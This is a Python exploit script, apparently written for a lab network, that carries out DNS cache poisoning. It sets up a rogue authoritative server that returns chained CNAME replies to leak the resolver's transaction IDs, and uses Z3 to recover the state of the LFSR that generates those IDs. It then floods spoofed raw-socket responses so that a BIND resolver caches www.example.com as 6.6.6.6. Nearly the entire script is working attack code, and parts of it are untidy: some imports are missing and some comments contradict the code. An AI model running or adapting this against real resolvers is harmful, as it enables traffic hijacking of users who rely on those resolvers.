import socket
import threading
import z3
from scapy.all import DNS, DNSRR, DNSQR, IP, UDP, sr1, raw

target_dns  = "10.9.0.53"
attacker_ip = "10.9.0.10"
TXIDS = []

def parse_index(qname: str) -> int:
    try:
        return int(qname.strip('.').split('.')[0])
    except ValueError:
        return -1

def run_auth_server(host="0.0.0.0", port=53, count=30):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((host, port))
    print("Auth server listening on {}:{}".format(host, port))

    while len(TXIDS) < count:
        data, addr = sock.recvfrom(512)

        try:
            dns_query = DNS(data)
            if dns_query.qr != 0 or dns_query.qd is None:
                continue
            txid  = dns_query.id
            qname = dns_query.qd.qname.decode()
        except Exception as e:
            print("[!] Bad packet from {}: {}".format(addr, e))
            continue

        index = parse_index(qname)
        if index < 0:
            print("[?] Cannot parse index from {}, ignoring".format(qname))
            continue

        TXIDS.append(txid)
        print("[+] TXID {:5d} (0x{:04X}) | hop {:02d} | from {} | qname: {}".format(
            txid, txid, len(TXIDS)-1, addr[0], qname))

        next_name = "{}.leak.attacker.com.".format(index + 1)

        if len(TXIDS) >= count:
            # Last hop: send a real A record to terminate cleanly
            pkt = DNS(
                id=txid, qr=1, aa=1, rd=0, ra=0,
                qd=dns_query.qd,
                an=DNSRR(rrname=qname, type="A", rclass="IN", ttl=0, rdata=attacker_ip),
            )
        else:
            # CNAME in ANSWER section: BIND follows it without referral-loop detection
            pkt = DNS(
                id=txid, qr=1, aa=1, rd=0, ra=0,
                qd=dns_query.qd,
                an=DNSRR(
                    rrname=qname,
                    type="CNAME",
                    rclass="IN",
                    ttl=0,
                    rdata=next_name,   # "1.leak.attacker.com.", "2..." etc.
                ),
            )

        sock.sendto(raw(pkt), addr)

    print("\n[*] Done. Captured TXIDs : {}".format(TXIDS))
    deltas = [TXIDS[i+1]-TXIDS[i] for i in range(len(TXIDS)-1)]
    print("[*] Deltas             : {}".format(deltas))

threading.Thread(target=run_auth_server, daemon=True).start()

import time; time.sleep(0.5)
print("[*] 1) Triggering chain via BIND at {}...".format(target_dns))
trigger = IP(dst=target_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="0.leak.attacker.com."))
sr1(trigger, timeout=30, verbose=0)
print("[*] 2) Leaked the following TXIDs: {}".format(TXIDS))
TAP1 = 0x80000057  # Example 32-bit tap
TAP2 = 0x80000062  # Example 32-bit tap
STATE_BITS = 32

def generate(state, tap):
    """Example LFSR generate function. MODIFY THIS TO MATCH YOUR LFSR's BEHAVIOR."""

    
    if  state & 0x1 == 1:
        state = (state>>1)^ tap
    else:
        state = state>>1
    return state

def step_cross(lfsr1, lfsr2):
    """Cross-coupled skip: each LFSR skips based on the OTHER's LSB."""

    skip1 = lfsr2 & 0x1
    skip2 = lfsr1 & 0x1

    if skip1: lfsr1 = generate(lfsr1, TAP1)
    if skip2: lfsr2 = generate(lfsr2, TAP2)

    new1 = generate(lfsr1, TAP1)
    new2 = generate(lfsr2, TAP2)

    return new1, new2, (new1 ^ new2) & 0xFFFF 



def z3_generate(state, tap):
    """
    Symbolic representation of the LFSR step.
    ** MODIFY THIS IF YOUR generate() DIFFERS **
    Assumes standard Galois LFSR: shift right, XOR with tap if LSB was 1.
    """
    lsb = state & 0x1
    # MUST use LShR for logical shift right in Z3, NOT >>
    shifted = z3.LShR(state, 1)
    return z3.If(lsb == 1, shifted ^ tap, shifted)

def z3_step_cross(lfsr1, lfsr2, tap1, tap2):
    """
    Symbolic equivalent of your step_cross function.
    """
    skip1 = lfsr2 & 0x1
    skip2 = lfsr1 & 0x1
    
    # If skip condition met, advance state, otherwise keep current
    lfsr1_skipped = z3.If(skip1 == 1, z3_generate(lfsr1, tap1), lfsr1)
    lfsr2_skipped = z3.If(skip2 == 1, z3_generate(lfsr2, tap2), lfsr2)
    
    # Generate new states
    new1 = z3_generate(lfsr1_skipped, tap1)
    new2 = z3_generate(lfsr2_skipped, tap2)
    
    # The output is the XOR of the two new states, masked to 16 bits
    out = (new1 ^ new2) & 0xFFFF
    
    return new1, new2, out

# ---------------------------------------------------------
# SOLVER EXECUTION
# ---------------------------------------------------------
print("[*] Initializing Z3 Solver...")
s = z3.Solver()

# Define the initial unknown symbolic states
state1 = z3.BitVec('lfsr1_init', STATE_BITS)
state2 = z3.BitVec('lfsr2_init', STATE_BITS)

# Keep track of the moving state variables
curr_state1 = state1
curr_state2 = state2

# Feed the 20 leaked outputs into the solver's constraints
print("[*] Feeding {} leaked TXIDs into constraints...".format(len(TXIDS)))
for i, leak in enumerate(TXIDS):
    curr_state1, curr_state2, out = z3_step_cross(curr_state1, curr_state2, TAP1, TAP2)
    s.add(out == leak)

# ---------------------------------------------------------
# CRACKING AND PREDICTION
# ---------------------------------------------------------
print("[*] Solving for initial states...")
found_init1 = None
found_init2 = None
if s.check() == z3.sat:
    m = s.model()
    
    # Extract the recovered initial states
    found_init1 = m[state1].as_long()
    found_init2 = m[state2].as_long()

    #for i in range(20):
    #    found_init1, found_init2, predicted_id = step_cross(found_init1, found_init2)
    #    print("[+] Prediction #{}: TXID {} (0x{:04x})".format(i+1, predicted_id, predicted_id))
    
else:
    print("[-] UNSAT. The solver could not find a valid state.")
    print("    Double-check your taps, your generate() logic, and ensure the leaks are contiguous.")
    exit(-1)

def sniff_port_and_txid(max_attempts):
    global incr
    
    for attempt in range(1, max_attempts + 1):
        print("[*] Leak attempt {}/{}...".format(attempt, max_attempts))
        sniffer = AsyncSniffer(
            iface="eth0",
            count=1,
            timeout=5,
            lfilter=lambda p: (
                p.haslayer(IP)
                and p.haslayer(UDP)
                and p.haslayer(DNS)
                and p[DNS].qr == 0
                and p[IP].src == target_dns
                and p[IP].dst == leak_ns_ip
                and p[UDP].dport == 53
            ),
        )
        sniffer.start()
        time.sleep(0.06)
        incr+=1
        trigger_leak = (
            IP(dst=target_dns)
            / UDP(sport=12345, dport=53)
            / DNS(rd=1, qd=DNSQR(qname="{}.leak.attacker.com".format(incr), qtype="A"))
        )
        send(trigger_leak, verbose=0)

        sniffer.join()
        if sniffer.results and len(sniffer.results) > 0:
            leaked_txid = sniffer.results[0][DNS].id
            target_port = sniffer.results[0][UDP].sport
            print("[+] Leaked TXID: {}, Port: {}".format(leaked_txid, target_port))
            return leaked_txid, target_port

    print("[-] Could not leak TXID/port from local-dns to attacker.")
    exit(1)

from scapy.all import *
target_dns = "10.9.0.53"
dns_server = "10.9.1.153"
example_auth_dns = "10.9.0.154"
leak_ns_ip = "10.9.0.10"
victim_ip = "10.9.0.20"
fake_ip = "6.6.6.6"
print("[*] 0. First query, just to get the resolver to cache the NS record for example.com...")
test_query = IP(dst=target_dns)/UDP(sport=12345, dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com.", qtype="NS"))
ans = sr1(test_query, timeout=10, verbose=0)

incr =0 
trigger_query = (
    IP(dst="10.9.0.53")
    / UDP(sport=12345, dport=53)
    / DNS(rd=1, qd=DNSQR(qname="www.example.com.", qtype="A"))
)

leaked_txid, target_port = sniff_port_and_txid(5)
# Use the RAW SOCKET approach for speed
base_pkt = (
    IP(src=example_auth_dns, dst=target_dns) /
    UDP(sport=53, dport=target_port, chksum=0) /
    DNS(id=0, qr=1, aa=1, qd=DNSQR(qname="www.example.com."), 
        an=DNSRR(rrname="www.example.com.", type='A', ttl=86400, rdata=fake_ip))
)
print("[*] 2. Triggering resolver to query www.example.com...")
while True:
    found_init1, found_init2, tz = step_cross(found_init1, found_init2)
    print("[+] skip: TXID {}".format(tz))
    if tz == leaked_txid:
        break

raw_bytes = bytearray(raw(base_pkt))
s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
list_to_send = []
for i in range(1, 21):
    found_init1, found_init2, tz = step_cross(found_init1, found_init2)
    list_to_send.append(tz)
print("[*] 2. Triggering resolver to query www.example.com...")
send(trigger_query, verbose=0)

print("[*] 3. Sending and spoofing responses.")
start = time.time()
#while time.time() - start < 0.04:  # Run for a maximum of 0.04 seconds
for tx_id in list_to_send:
    # Pack the NEXT txid into the raw bytearray (offset 28 is the DNS ID field)
    struct.pack_into('!H', raw_bytes, 28, tx_id)
    s.sendto(raw_bytes, (target_dns, 0))

print("[*] 4. Verifing if cache poisoning was successful...")
test_query = IP(dst=target_dns)/UDP(sport=12345, dport=53)/DNS(rd=1, qd=DNSQR(qname="www.example.com"))
ans = sr1(test_query, timeout=10, verbose=0)
# print(ans.show() if ans else "No answer received")
#leaked_txid2, target_port = sniff_port_and_txid(5)
#diff = leaked_txid2-leaked_txid-1
#print("[*] Leaked TXID difference: {}".format(diff))
if ans and ans.haslayer(DNSRR) and ans[DNSRR].rdata == fake_ip:
    print("[+] Attack SUCCESSFUL! {} is poisoned to {}".format("www.example.com", fake_ip))
else:
    print("[-] Attack FAILED. Cache shows different or timeout.")